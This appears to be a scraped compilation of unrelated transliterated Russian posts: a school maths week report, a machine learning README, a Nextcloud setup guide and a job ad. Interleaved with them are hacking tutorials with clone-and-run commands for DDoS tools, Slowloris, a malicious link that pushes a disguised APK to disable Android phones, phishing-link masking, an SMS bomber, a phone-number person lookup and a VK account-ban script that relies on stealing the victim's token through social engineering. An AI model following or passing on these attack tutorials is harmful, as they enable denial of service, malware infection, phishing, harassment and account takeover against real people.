Vtoroi den' (8 dekabria) predmetnoi NEDELI Matematiki i Informatiki proshel ochen' interesno i poznavatel'no.  Uchashchiesia 5A i 5B klassa vmeste s uchitelem matematiki Shaposhnik E.A. otpravilis' na vneklassnoe meropriiatie <<Chas zanimatel'noi matematiki>>. Zainteresovannost' detei vyzval konkursnyi, igrovoi kharakter sorevnovanii. Uchastniki pokazali teoreticheskie znaniia, umenie reshat' logicheskie zadachi, raskryli tvorcheskii potentsial.  Uchashchiesia 8kh i 10B klassov reshali zadachki matematicheskogo soderzhaniia, rebusy i golovolomki. Vse zadaniia byli vypolneny na otlichno.    Ucheniki 3-4 klassov na peremenakh reshali zadaniia po informatike, otgadyvali rebusy, sporili drug s drugom v khode resheniia zadach, uznavali o izvestnykh liudiakh matematiki i informatiki i risovali po kletochkam. S zadaniiami vse spravilis', no bystree vsekh byl 4-B klass, on i stanovitsia pobeditelem. V techenii vsego dnia byli provedeny igry i viktoriny uchitelem informatiki Biriukovoi E.A. po informatike i IKT v 8-A, 10-B, 11-A i 7-B klassakh. Vse poluchili polozhitel'nye emotsii, a komandy pobeditelei eshche i <<OTLIChNYE>> otsenki.  A uchitel' informatiki Vytovtov A.Iu. s desiatym <<B>> klassom poigrali v igru <<chto? Gde, kuda?>>. Gruppa byla razdelena na dve komandy <<Python3>> i <<disket>> odin iz uchashchikhsia kto uzhe imel opyt sborki zanimalsia podschetom vremeni. Pered komandami byli razlozheny komplektuiushchie, proveden instruktazh kakie elementy kuda ustanavlivaiutsia i na chto obratit' vnimanie. Provedi zhereb'evku, pervoi nachala sborku komanda <<Python3>>, zatem komanda <<disket>>. Uchastniki komandy <<Python3>> vypolnili zadachu za 7 minut 21 sekundu, chto na 11 sekund bystree rezul'tata komandy <<disket>>.  Uchastniki poluchili poleznyi prakticheskii opyt po sborke nastol'nogo PK.  A s odinnadtsatym <<A>> klassom my poigrali v igru, gde pri pomoshchi iazyka programmirovaniia Python3 byla sozdana programma pole chudes. Gruppa razdelilas' na dve komandy <<Kozyr'ki >> i <<Kamen'>>, i pri pomoshchi generatora sluchainykh chisel igrokam vypali sluchainym obrazom ochki, libo propusk khoda, libo obnulenie vsekh ochkov s propuskom khoda. Esli komanda srazu nazyvaet slovo, to programma zaschityvaet ei pobedu i vyvodit kolichestvo nabrannykh ochkov. Po rezul'tatam pobedila komanda Kozyr'ki so schetom 4200 ochkov, protiv 3200 u komandy kamen'.   Uchashchiesia  6-A, 6-B,   9-A i 7-B klassov poluchili zadanie ot uchitelia matematiki Nabatovoi M.D.,  matematicheskii krossvord. On sostoial iz matematicheskikh poniatii i terminov. Nekotorye slova v krossvorde byli novymi, eti poniatiia eshche ne izuchalis' v kurse shkol'noi matematiki. Odnako, blagodaria pravilam razgadyvaniia krossvordov, rebiata pravil'no ikh otgadali. A znachit, popolnili svoi matematicheskii slovar'. Pervymi spravilis' uchashchiesia  6-B klassa, za nimi - 9-A klassa, zatem - 6-A klassa.  Pozdravliaem pobeditelei! Vse namechennye meropriiatiia provodilis' v khoroshem tempe, ukladyvalis' v otvedionnoe vremia, podderzhivalas' khoroshaia distsiplina za schiot interesnogo soderzhaniia konkursov i kontrolia so storony uchitelei-organizatorov.    Predmetnaia nedelia prodolzhaetsia i shkol'nikov zhdet eshche mnogo uvlekatel'nykh meropriiatii.

Bloknoty Dlia Mashinnogo Obucheniia  Etot proekt napravlen na to, chtoby nauchit' vas osnovam mashinnogo obucheniia na python. On soderzhit primer koda i resheniia uprazhnenii iz moei knigi O'Reilly Hands-on Machine Learning with Scikit-Learn and TensorFlow:  Prosto otkroite interesuiushchie vas bloknoty Jupyter: Ispol'zovanie jupyter.org prosmotrshchik zapisnykh knizhekPrimechanie: github.com programma prosmotra zapisnykh knizhek takzhe rabotaet, no ona rabotaet medlennee, i matematicheskie formuly otobrazhaiutsia nepravil'no,putem klonirovaniia etogo repozitoriia i zapuska Jupyter lokal'no. Eta optsiia pozvoliaet vam igrat' s kodom. V etom sluchae sleduite privedennym nizhe instruktsiiam po ustanovke,ili zapustiv bloknoty v Deepnote. Eto pozvoliaet vam igrat' s kodom onlain v vashem brauzere. Naprimer, vot ssylka na pervuiu glavu:  Ustanovka  Vo-pervykh , vam nuzhno budet ustanovit' git, esli u vas ego eshche net.  Zatem kloniruite etot repozitorii, otkryv terminal i vvedia sleduiushchie komandy: $ cd $HOME # or any other development directory you prefer $ git clone https://github.com/ageron/handson-ml.git $ cd handson-ml  Esli vy ne khotite ustanavlivat' git, vy mozhete vmesto etogo skachat' master.zip, raspakuite ego, pereimenuite poluchennyi katalog handson-mli peremestite ego v svoi katalog razrabotki.  Esli vy khotite proiti cherez Glavu 16 ob obuchenii podkrepleniiu, vam nuzhno budet ustanovit' OpenAI gym i ego zavisimosti dlia modelirovaniia Atari.  Esli vy znakomy s Python i znaete, kak ustanavlivat' biblioteki Python, prodolzhaite ustanavlivat' biblioteki, perechislennye v requirements.txtrazdele i perekhodite k razdelu Starting Jupyter. Esli vam nuzhny podrobnye instruktsii, pozhaluista, chitaite dal'she.  Python I Neobkhodimye Biblioteki  Konechno, vam iavno nuzhen piton. Python 3 uzhe predustanovlen na mnogikh sistemakh v nastoiashchee vremia. Vy mozhete proverit', kakaia versiia u vas est', vvedia sleduiushchuiu komandu (vozmozhno, vam pridetsia zamenit' python3ee napython): $ python3 --version # for Python 3  Liubaia versiia Python 3 dolzhna byt' v poriadke, predpochtitel'no 3.5 ili vyshe. Esli u vas net Python 3, ia rekomenduiu ustanovit' ego. Dlia etogo u vas est' neskol'ko variantov: na Windows ili MacOSX vy mozhete prosto zagruzit' ego s python.orgna MacOSX vy mozhete al'ternativno ispol'zovat' MacPorts ili Homebrew. Esli vy ispol'zuete Python 3.6 na MacOSX, vam neobkhodimo vypolnit' sleduiushchuiu komandu dlia ustanovki certifipaketa sertifikatov, poskol'ku Python 3.6 na MacOSX ne imeet sertifikatov dlia proverki SSL-soedinenii (sm. Etot vopros StackOverflow): $ /Applications/Python 3.6/Install Certificates.command  V Linux, esli vy ne znaete, chto delaete, vy dolzhny ispol'zovat' sistemu upakovki vashei sistemy. Naprimer, v Debian ili Ubuntu vvedite: $ sudo apt-get update $ sudo apt-get install python3 python3-pip  Drugoi variant-skachat' i ustanovit' Anaconda. Eto paket, kotoryi vkliuchaet v sebia kak Python, tak i mnogie nauchnye biblioteki. Vy dolzhny predpochest' versiiu Python 3.  Esli vy reshite ispol'zovat' Anaconda, prochtite sleduiushchii razdel ili pereidite k razdelu Using pip.  Ispol'zovanie Anakondy  Posle ustanovki Anaconda( ili Miniconda) mozhno vypolnit' sleduiushchuiu komandu: $ conda env create -f environment.yml  Eto dast vam sredu conda s imenemmlbook, gotovuiu k ispol'zovaniiu! Prosto aktiviruite ego, i u vas budet vse nastroeno dlia tebia: $ conda activate mlbook  U vas vse gotovo! Dalee, pereiti k startovoi sektsii Jupyter.  Ispol'zovanie pip  Esli vy ne ispol'zuete Anaconda, vam nuzhno ustanovit' neskol'ko nauchnykh bibliotek Python, neobkhodimykh dlia etogo proekta, v chastnosti NumPy, Matplotlib, Pandas, Jupyter i TensorFlow (i nekotorye drugie). Dlia etogo vy mozhete ispol'zovat' integrirovannuiu upakovochnuiu sistemu Python, pip, ili vy mozhete predpochest' ispol'zovat' sobstvennuiu upakovochnuiu sistemu vashei sistemy (esli ona dostupna, naprimer, v Linux ili MacOSX pri ispol'zovanii MacPorts ili Homebrew). Preimushchestvo ispol'zovaniia pip zakliuchaetsia v tom, chto legko sozdavat' neskol'ko izolirovannykh sred Python s razlichnymi bibliotekami i razlichnymi versiiami bibliotek (naprimer odna sreda dlia kazhdogo proekta). Preimushchestvo ispol'zovaniia sistemy upakovki vashei sistemy zakliuchaetsia v tom, chto sushchestvuet men'shii risk vozniknoveniia konfliktov mezhdu vashimi bibliotekami Python i drugimi paketami vashei sistemy. Poskol'ku u menia est' mnogo proektov s razlichnymi trebovaniiami k biblioteke, ia predpochitaiu ispol'zovat' pip s izolirovannymi sredami. Krome togo, pakety pip obychno iavliaiutsia samymi poslednimi iz dostupnykh, v to vremia kak pakety Anaconda i system chasto nemnogo otstaiut.  Eto komandy, kotorye vam nuzhno vvesti v terminal, esli vy khotite ispol'zovat' pip dlia ustanovki neobkhodimykh bibliotek. Primechanie: vo vsekh sleduiushchikh komandakh, esli vy reshili ispol'zovat' Python 2, a ne Python 3 , Vy dolzhny zamenit' pip3napip, i python3s python.  Vo pervykh vam nuzhno ubedit'sia chto u vas ustanovlena posledniaia versiia pip: $ python3 -m pip install --user --upgrade pip  Eta --useroptsiia ustanovit posledniuiu versiiu pip tol'ko dlia tekushchego pol'zovatelia. Esli vy predpochitaete ustanavlivat' ego v masshtabakh vsei sistemy (to est' dlia vsekh pol'zovatelei), u vas dolzhny byt' prava administratora (naprimer, ispol'zovat' sudo python3vmesto python3Linux), i vy dolzhny udalit' etu --useroptsiiu. To zhe samoe verno i dlia privedennoi nizhe komandy, kotoraia ispol'zuet etot --userparametr.  Zatem vy mozhete dopolnitel'no sozdat' izolirovannuiu sredu. Eto rekomenduetsia, tak kak pozvoliaet imet' razlichnuiu sredu dlia kazhdogo proekta (naprimer, odnu dlia etogo proekta), s potentsial'no ochen' raznymi bibliotekami i raznymi versiiami: $ python3 -m pip install --user --upgrade virtualenv $ python3 -m virtualenv -p `which python3` env  Eto sozdaet novyi katalog, vyzyvaemyi envv tekushchem kataloge, soderzhashchii izolirovannuiu sredu Python, osnovannuiu na Python 3. Esli vy ustanovili neskol'ko versii Python 3 v svoei sisteme, vy mozhete `which python3`zamenit' ikh putem k ispolniaemomu failu Python, kotoryi vy predpochitaete ispol'zovat'.  Teper' vy dolzhny aktivirovat' etu sredu. Vam nuzhno budet zapuskat' etu komandu kazhdyi raz, kogda vy khotite ispol'zovat' etu sredu. $ source ./env/bin/activate  V Windows eta komanda nemnogo otlichaetsia: $ .envScriptsactivate  Zatem ispol'zuite pip dlia ustanovki neobkhodimykh paketov python. Esli vy ne ispol'zuete virtualenv, vam sleduet dobavit' etu --useroptsiiu (v kachestve al'ternativy vy mozhete ustanovit' biblioteki po vsei sisteme, no dlia etogo, veroiatno, potrebuiutsia prava administratora, naprimer, ispol'zovanie sudo pip3vmesto pip3Linux). $ python3 -m pip install --upgrade -r requirements.txt  Otlichno! Vy vse gotovy, vam prosto nuzhno nachat' Jupyter seichas.  Zapusk Iupitera  Ladno! Teper' vy mozhete zapustit' Jupyter, prosto nabrav: $ jupyter notebook  Eto dolzhno otkryt' vash brauzer, i vy dolzhny uvidet' drevovidnoe predstavlenie Jupyter s soderzhimym tekushchego kataloga. Esli Vash brauzer ne otkryvaetsia avtomaticheski, posetite stranitsu 127.0.0.1: 8888. Nazhmite na index.ipynbknopku, chtoby nachat' rabotu!  #mashinnoeobuchenie, #machinelearning, #ML, #Python

DDoS ataka na sait    Ustanovka:  1. apt update && apt upgrade  2. git clone https://github.com/HardyTomas/DDos-Attack-OVH-   3. cd DDos-Attack-OVH-  4. pip3 install toripchanger  5. pip3 install -r requirements.txt  Zapusk:  1. python3 80port.py  Posle vypolneniia poslednei komandy, vas poprosit vvesti adres saita, vvodite. Nachnetsia Dos, esli popytka ataki budet udachnoi, sait budet nedostupen.

DISKLEIMER: Eta stat'sia sozdana v razvlekatel'nykh tseliakh, i ne neset za soboi otvestvennosti.   Delaem DDOS-ataku cherez Termux  Segodnia my razberiom odin iz samykh luchshikh instrumentov, dlia DDOS-ataki cherez Termux.  Rech' poidiot o rasshirenii Slowloris, kotoroe zastavliaet server, na kotoryi vediotsia ataka, obsluzhivat' ogromnoe kolichestvo otkrytykh soedinenii cherez nepreryvnogo spama nezavershionnymi HTTP-zaprosami.  Pristupim:   1. Pervym delom nam potrebuetsia ustanovit' python i git v nash Termux,  dlia etogo propisyvaem: apt install python git 2. Posle etogo kloniruem repozitorii i otkryvaem papku: git clone https://github.com/gkbrk/slowloris.git && cd slowloris 3. Chtoby ispol'zovat' rasshirenie, pishem sleduiushchuiu komandu, gde vmesto example.com propisyvaem adres saita, na kotoryi budet vestis' ataka: python3 slowloris.py example.com

Nakhodim cheloveka po nomeru telefona  Probit' cheloveka po nomeru telefona seichas ne vyzyvaet zatrudnenii dazhe u samogo neopytnogo pol'zovatelia seti. Chtoby uznat' tochnyi gorod prozhivaniia cheloveka, my vospol'zuemsia utilitoi Sherlock v Termux. Nastroika 1. Ustanavlivaem Termux  2. Propisyvaem komandy v konsol': # pkg install python3-pip # pkg install git # git clone https://github.com/sherlock-project/s... # cd sherlock # python3 -m pip install -r requirements.txt # python3 sherlock.py Ispol'zovanie 1. Posle vvoda komand u vas poiavitsia meniu <<utility>>.  2. Nazhmite tsifru 2 > nazhmite Enter > vvedite nuzhnyi vam nomer

Nekotorye svedeniia ob iskusstvennykh neironnykh setiakh i metodakh ikh obucheniia. Chast' 3  Iskusstvennye neironnye seti nakhodiat prilozheniia v razlichnykh oblastiakh nauki: komp'iuternom zrenii, raspoznavanii rechi, analize eksperimental'nykh dannykh i drugikh zadachakh. V tret'ei chasti doklada planiruetsia rassmotret' primenenie neirosetei k dvum zadacham: klassifikatsiia razmechennykh dannykh i raspoznavanie rukopisnykh tsifr. Dlia napisaniia programm budet ispol'zovan iazyk Python i biblioteka TensorFlow, pozvoliaiushchaia sushchestvenno uprostit' protsess obucheniia neirosetei.  Zhelaiushchie mogut popraktikovat'sia priamo na zaniatii, dlia etogo neobkhodimo nalichie Python3 i TensorFlow.  Dokl.: Aleksei Kazarnikov (University of Heidelberg)  Priglashaem vsekh zhelaiushchikh!  Subbota, 5 dekabria Nachalo v 17:00  Seminary prokhodiat onlain, zhelaiushchikh priniat' uchastie - vystupit' ili prosto poslushat', a takzhe po liubym drugim voprosam, prosim obrashchat'sia v orgkomitet (https://vk.com/id89295337, https://vk.com/daschuta) ili v soobshcheniia gruppy.

DARK DEEP    Ubivaem smartfon ssylkoi  Segodnia khochu rasskazat' vam, kak odnoi vredonosnoi ssylkoi mozhno v priamom smysle "ubit'" smartfon na baze Android.  Instruktsiia:  Dlia nachala, otkryvaem terminal v Kali Linux i vvodim sleduiushchuiu komandu dlia obnovleniia paketov:  update && pkg upgrade  Pered sozdaniem vredonosnoi ssylki nuzhno ustanovit' git i Python s pomoshch'iu dannykh komand:  install git pkg install python2 pkg install python3  Dalee, ustanavlivaem utilitu Lolcat komandoi:  install lolcat  Kloniruem imenno etot repozitorii s GitHub:  clone https://github.com/noob-hackers/Infect  Perekhodim v papku nashego "orudiia":  Infect  Nazhimaem i zapuskaem:  infect.s  Kak tol'ko zapustili, vybiraem pervyi punkt. Dalee prosto soglashaemsia so vsem, nazhimaia tri raza podriad Enter. Gotovo!  Kogda zhertva pereidet po nashei ssylke, na ustroistvo skachaetsia fail pod nazvaniem System Update.apk, no etogo malo. Nuzhno chtob zhertva ustanovila i zapustila fail, tol'ko posle etogo telefon zhertvy budet zarazhen virusom Elite, kotoryi prosto ne pozvolit vospol'zovat'sia ustroistvom

Privet! Menia zovut Anton Poliakov, i ia razrabatyvaiu analiticheskoe khranilishche dannykh i ELT-protsessy v ManyChat. V nastoiashchii moment v mire bol'shikh dannykh sushchestvuiut neskol'ko osnovnykh igrokov, na kotorykh obrashchaiut vnimanie pri vybore instrumentariia i podkhodov k rabote analiticheskikh sistem. Segodnia ia rasskazhu vam, kak my reshili otklonit'sia ot skuchnykh klassicheskikh OLAP-reshenii v vide Vertica ili Exasol i poprobovat' redkuiu, no ochen' privlekatel'nuiu oblachnuiu DWaaS (Data Warehouse as a Service) Snowflake v kachestve osnovy dlia nashego khranilishcha.
K nashei novoi programme <<Apache Spark dlia data-inzhenerov>> i vebinaru o kurse, kotoryi proidet 2 dekabria, my podgotovili perevod obzornoi stat'i o Spark 3.0.

K nashei novoi programme "Apache Spark dlia data-inzhenerov" i vebinaru o kurse, kotoryi proidet 2 dekabria, my podgotovili perevod obzornoi stat'i o Spark 3.0.

HackTheBox -- populiarnaia ploshchadka sredi spetsialistov informatsionnoi bezopasnosti, provodiashchikh testirovanie na proniknovenie. Mnogo_bukv. Mozhno ne chitat'. Vse nizheopisannoe bylo tol'ko chto protestirovano v virtual'noi mashine i uspeshno zarabotalo.  Reshil napisat' nebol'shuiu stat'iu po ustanovke sobstvennogo oblaka #nextcloud na #ubuntu #server 20.04  Delo v tom, chto mne ponadobilos' sobstvennoe oblako na sobstvennom servere s vozmozhnost'iu sinkhronizatsii dlia vsekh moikh komp'iuterov, i, samoe glavnoe, dlia dostupa k dokumentam i obuchaiushchim video s telefona i plansheta.  Poryvshis' na prostorakh interneta i v etikh vashikh guglakh, perechitav kuchu statei, pochemu-to okazalos', chto vezde polno breda i/ili stat'i ne polnye, s oshibkami i t.p.    Dannaia stat'ia prednaznachena, prezhde vsego, dlia menia lichno, nu i eshche dlia tekh, kto ponimaet, o chem rech'.  # Besplatnye domennye imena v domene .tk mozhno poluchit' na www.freenom.com   # Podgotovitel'nye deistviia.  Estestvenno, neobkhodimo ustanovit' ubuntu server 20.04 (podoidet 20.10, na drugikh ne testiroval). Zhelatel'no (a esli mashina virtual'naia, to i neobkhodimo) srazu zhe ustanovit' ssh.  Esli ustanavlivali s polucheniem adresa po DHCP, to na routere nado propisat' ip kak staticheskii, libo perenastroit' ip v Ubuntu cherez Netplan Posmotret' svoi ip v Ubuntu proshche vsego komandoi sudo ip -a  V routere sdelat' probros portov s vneshnego adresa na vnutrennii po portam 80 i 443. No delo v tom, chto esli tak prosto probrosit' porty, to perestanet rabotat' http i https na ostal'nykh komp'iuterakh, poetomu nam neobkhodim staticheskii vydelennyi ip adres i pri probrose v Destination Address obiazatel'no ukazyvat' svoi ip. Esli komu interesno, v lichke mogu opisat', kak eta shtuka rabotaet.    #-------------------  # Ustanavlivaem vspomogatel'nye utility.    sudo apt-get install nano mc zip -y    #-------------------  # Sinkhroniziruem vremia.    # Ustanavlivaem utilitu chrony:    sudo apt-get install chrony -y    # Vystavliaem nuzhnyi chasovoi poias:    sudo timedatectl set-timezone Europe/Moscow    # Razreshaem zapusk demona chrony:    sudo systemctl enable chrony  #-----------------------------  # Etot punkt mozhno propustit', esli nastraivaete oblako na lokal'nyi disk, a ne na otdel'nuiu mashinu s dostupom po nfs  #-------------------  # Stavim nfs-client  sudo apt install nfs-common -y    #-------------------  # Montiruem papku nfs  sudo mkdir -p /nfs/nc  sudo mount your_host_ip:/papka_shary_nfs/ /nfs/nc  sudo ls -l /nfs/nc/  sudo df -h  sudo du -sh /nfs/nc/    #-------------------  # Montiruem nfs pri zagruzke  sudo nano /etc/fstab   # Dobavim takuiu stroku v konets faila   your_host_ip:/papka_shary_nfs/ /nfs/nc nfs auto,nofail,noatime,nolock,intr,tcp,actimeo=1800 0 0    #-------------------  # Stavim nginx  sudo apt install nginx -y  sudo nginx -V  sudo systemctl enable nginx  sudo systemctl start nginx  #-------------------  # Stavim php 7.4    sudo apt install php7.4-fpm php7.4-mysql php7.4 php7.4-curl php7.4-gd php7.4-json php7.4-mbstring php7.4-common php7.4-xml php7.4-zip php7.4-opcache php-apcu php-imagick -y    # Nastraivaem php 7.4    sudo nano /etc/php/7.4/fpm/pool.d/www.conf    # snimaem kommentarii     env[HOSTNAME] = $HOSTNAME   env[PATH] = /usr/local/bin:/usr/bin:/bin   env[TMP] = /tmp   env[TMPDIR] = /tmp   env[TEMP] = /tmp    # Nastraivaem php.ini:  sudo nano /etc/php/7.4/fpm/php.ini     opcache.enable=1   opcache.enable_cli=1   opcache.interned_strings_buffer=8   opcache.max_accelerated_files=10000   opcache.memory_consumption=128   opcache.save_comments=1   opcache.revalidate_freq=1    # Razreshaem avtozapusk php-fpm i perezapuskaem ego:  sudo systemctl enable php7.4-fpm  sudo systemctl restart php7.4-fpm    #-------------------  # Ustanavlivaem MariaDB:  sudo apt install mariadb-server  sudo systemctl enable mariadb  sudo systemctl start mariadb    # Zapusk stsenariia bezopasnosti (zdes' mozhno pomeniat' parol' ruta, ubrat' nenuzhnye razresheniia):    sudo mysql_secure_installation    # Sozdaem bazu dannykh dlia Nextcloud (v primere ukazan parol' nextcloud, ego luchshe zamenit' na svoi) :  sudo mysql -u root -p  # Vvodim parol' ruta dlia MariaDB     >  CREATE DATABASE nextcloud;  CREATE USER 'nextcloud'@'localhost' IDENTIFIED BY 'nextcloud';  GRANT ALL ON nextcloud.* TO 'nextcloud'@'localhost' IDENTIFIED BY 'nextcloud' WITH GRANT OPTION;  FLUSH PRIVILEGES;  EXIT;    # Teper' nado sozdat' fail konfiguratsii Nginx dlia Nextcloud  sudo nano /etc/nginx/sites-enable/nextcloud.conf  # I vstavliaem v nego sleduiushchii tekst, estestvenno, zameniv nextcloud.vash.domen na svoi servera    server {   listen 80;   server_name nextcloud.vash.domen;   return 301 https://$server_name$request_uri;  }    server {   listen 443 ssl;   server_name nextcloud.vash.domen;     ssl_certificate /etc/nginx/ssl/cert.pem;   ssl_certificate_key /etc/nginx/ssl/cert.key;     root /var/www/nextcloud;     add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;   client_max_body_size 10G;   fastcgi_buffers 64 4K;     rewrite ^/caldav(.*)$ /remote.php/caldav$1 redirect;   rewrite ^/carddav(.*)$ /remote.php/carddav$1 redirect;   rewrite ^/webdav(.*)$ /remote.php/webdav$1 redirect;     index index.php;   error_page 403 = /core/templates/403.php;   error_page 404 = /core/templates/404.php;     location = /robots.txt {   allow all;   log_not_found off;   access_log off;   }     location ~ ^/(data|config|\.ht|db_structure\.xml|README) {   deny all;   }     location / {   rewrite ^/.well-known/host-meta /public.php?service=host-meta last;   rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last;   rewrite ^/.well-known/carddav /remote.php/carddav/ redirect;   rewrite ^/.well-known/caldav /remote.php/caldav/ redirect;   rewrite ^(/core/doc/[^\/]+/)$ $1/index.html;   try_files $uri $uri/ index.php;   }     location ~ ^(.+?\.php)(/.*)?$ {   try_files $1 = 404;   include fastcgi_params;   fastcgi_param SCRIPT_FILENAME $document_root$1;   fastcgi_param PATH_INFO $2;   fastcgi_param HTTPS on;   fastcgi_pass unix:/run/php/php7.4-fpm.sock;   }     location ~* ^.+\.(jpg|jpeg|gif|bmp|ico|png|css|js|swf)$ {   expires modified +30d;   access_log off;   }  }    # Teper' neobkhodimo poluchit' sertifikaty dlia ssl  # Ustanovka Certbot i ego plagina Nginx:    sudo apt install certbot python3-certbot-nginx    # Poluchaem sertifikaty dlia vsego (ia poluchal dlia vsekh poddomenov, kotorye propisal na freenom, v t.ch. dlia pochty, zabbiksa, i t.p., u vas mogut byt' i dolzhny byt' svoi)    # Snachala s kliuchom --dry-run proveriaem vse li v poriadke  sudo certbot certonly --agree-tos --email pochta@administratora -d vash.domen -d nextcloud.vash.domen -d cloud.vash.domen -d zabbix.vash.domen -d www.vash.domen -d mail.vash.domen --nginx --dry-run    # Esli vse khorosho, to poluchaem sertifikaty  sudo certbot certonly --agree-tos --email pochta@administratora -d vash.domen -d nextcloud.vash.domen -d cloud.vash.domen -d zabbix.vash.domen -d www.vash.domen -d mail.vash.domen --nginx    # Sertifikaty poiaviatsia v papke /etc/letsencrypt/live/vash.domen cert.pem chain.pem fullchain.pem privkey.pem    #-------------------   sudo nano /etc/nginx/sites-available/nextcloud.conf    # Podkliuchaem sertifikaty k saitu     ssl_certificate /etc/letsencrypt/live/vash.domen/fullchain.pem;   ssl_certificate_key /etc/letsencrypt/live/vash.domen/privkey.pem;    # Ustanavlivaem Nextcloud:    # Skachivaem posledniuiu versiiu s saite Nextcloud:  cd /tmp/  sudo wget https://download.nextcloud.com/server/releases/nextcloud-20.0.2.zip    sudo unzip nextcloud-20.0.2.zip    sudo cp -R nextcloud /var/www/nextcloud/    cd /var/www/  sudo chown -R www-data:www-data nextcloud/    sudo chown -R www-data:www-data /nfs/nc    # Pochti vse. Zakhodim na https://nextcloud.vash.domen/  # Sozdaem pol'zovatelia, parol', propisyvaem dostup k katalogu /nfs/nc/  # Propisyvaem sozdannuiu ranee bazu dannykh i parol' k nei.    # Poka vse, dal'she pristupaem k tiuningu.  # Esli budet interesno, napishu pro tiuning i ustanovku onlyoffice dlia nextcloud

!! Python developer / Python razrabotchik V komandu dlia udalennoi raboty ishchem Razrabotchika Python.Nuzhno razrabatyvat' programmnyi produkt v sfere monitoringa setevoi i servernoi infrastruktury. Chto ishchem v budushchem kollege:- opyt raboty c:* python3;* asyncio;* pymongo/mongoengine;* setevym programmirovaniem;- opyt raboty s subd:* mongodb;* postgresql (privetstvuetsia);* clickhouse (privetstvuetsia);- opyt sovmestnoi raboty:* git;* Gitlab (privetstvuetsia), Gitlab ci;* napisanie avtomaticheskikh testov: pytest;* rabota s sistemami kontrolia kachestva koda: flake8, pylink, mypy; Kruto, esli rabotali/znakomy s etim:* Pydantic;* FastAPI;* networkx/numpy;* grpc; Privetstvuetsia nalichie rabochikh open-source proektov.po usloviiam:* ofitsial'noe trudoustroistvo;* zarabotnaia plata polnost'iu belaia;* ob'iom zarabotnoi platy obsuzhdaetsia na sobesedovanii. Vse zavisit ot urovnia kvalifikatsii i opyta kandidata;* vozmozhnost' postroit' svoi grafik raboty;* adekvatnye kollegi, minimum biurokratii;* tol'ko udalennaia rabota; Podrobnosti pri vzaimnom interese.  Sviazat'sia mozhno po ssylke: https://msk-jobs.ru/msk/python_developer_python_razrabotchik-adv5144041.html  #rabota_Moskva #rabota_v_Moskve #rabota_MSK #Python_developer_Moskva #Python_razrabotchik_Moskva

Kak GRAMOTNO zamaskirovat' fishing-ssylku?  Post dlia tekh, u kogo uzhe poperek gorla zaselo ispolnenie fishinga cherez Njrok, Serveo, Localhost.run i t.p. I pravil'no, ved' eto legko palitsia liuboi zhertvoi s iq > 80.  Ispravit' situatsiiu pomozhet utilita UrlPhish - ona pozvoliaet zamaskirovat' fishing ssylku insty i VKontakte.  Dlia insty daiot 1 variant maskirovki, a dlia VK 3 varianta.   Pereidem k ustanovke i zapusku:  pkg install python3  pip3 install requests  pkg install git  git clone https://github.com/termux-lab/UrlPhish.git  cd UrlPhish  python3 urlp.py  Dalee vybiraem, na kakoi sait my izgotovili fishing.  Zatem ukazyvaem ssylku na nash fishing, nu a posle daiom nazvanie ssylke, po kotoroi budet peresylat' na real'nyi fishing.   Utilita rabotaet na vsekh OS s podderzhkoi python3

Nakhodim cheloveka po nomeru telefona!  Probit' cheloveka po nomeru telefona seichas ne vyzyvaet zatrudnenii dazhe u samogo neopytnogo pol'zovatelia seti. Chtoby uznat' tochnyi gorod prozhivaniia cheloveka, my vospol'zuemsia utilitoi Sherlock v Termux.  Instruktsiia:  Ustanavlivaem Termux i propisyvaem komandy v konsol':  pkg install python3-pip pkg install git git clone https://github.com/sherlock-project/s... cd sherlock python3 -m pip install -r requirements.txt python3 sherlock.py  Ispol'zovanie  Posle vvoda komand u vas poiavitsia meniu <<utility>>. Nazhmite tsifru 2 > nazhmite Enter > vvedite nuzhnyi vam nomer

#laifkhak    Besplatnyi SMS-bomber pod Android    Esli by usluga "zaspamit' svoikh nepriiatelei SMS do goreniia zhop" ne pol'zovalas' populiarnost'iu - platnye servisy, etu uslugu predostavliaiushchie, ne protsvetala.    Dlia nachala ubedites', chto prilozhenie Termux (https://play.google.com/store/apps/details?id=com.termux) ustanovleno.    Dalee po poriadku:    1. Proveriaem obnovlenie komandoi apt update -y && apt upgrade -y  2. Ustanavlivaem komandoi apt install git wget nano python python2 python3 perl clang libxslt zsh -y  3. Ustanavlivaem bombera komandoi git clone https://github.com/Denishnc/b0mb3r  4. Zakhodim v papku cd b0mb3r  5. Vstavliaem etu komandu dlia ustanovki python -m pip install -r requirements.txt  6. Zapuskaem, vvodia python main.py  7. Kopiruem ssylku v vide , kotoruiu vam vydast, i vstavliaem v brauzer. U menia ssylka http://192.168.100.3:8080/, u vas mozhet byt' drugaia.  8. Vvodim nomer v okoshke, kolichestvo povtorenii + stavim galochku "zvonki" (inogda ne rabotaet).  9. Nazhimaem knopku nachat' ataku    10. Pozdravliaiu! Vy - sms-troll' : 3
Ispol'zuiu: Python3.8 i Ubuntu 20.04.1 LTS; Versiia GNOME: 3.36.3

Banim akkaunty VKontakte  Saliut, bandity! Sut' Dlia nachala nam nuzhno zaiti v Termux i vvesti sleduiushchuiu komandu:  pkg install python3  Posle togo, kak nash paiton ustanovilsia, my ustanavlivaem git:  pkg install git  Dalee ustanavlivaem biblioteki:  pip install vk_api  pip install requests  pip install colorama  Esli vy sdelali eti deistviia, vam neobkhodimo klonirovat' repozitorii na svoio ustroistvo:  git clone https://github.com/darkcoding12/FAST-BAN  Chtoby zapustit' skript, propisyvaem v konsoli eto:  cd FAST-BAN  python fastban.py  Punkt 1  Dlia togo, chtoby zabanit' liubogo iuzera VKontakte, vam neobkhodimo vstavit' ego token v pole dlia vvoda. Akkaunt zabanitsia cherez 5-15 sekund. Kak poluchit' token? Vashei zhertve neobkhodimo uznat' svoi token cherez etot sait: https://vkhost.github.io/. Ispol'zuite tekhniki sotsial'noi inzhenerii, chtoby dostich' dannoi tseli.  Vsem udachi!

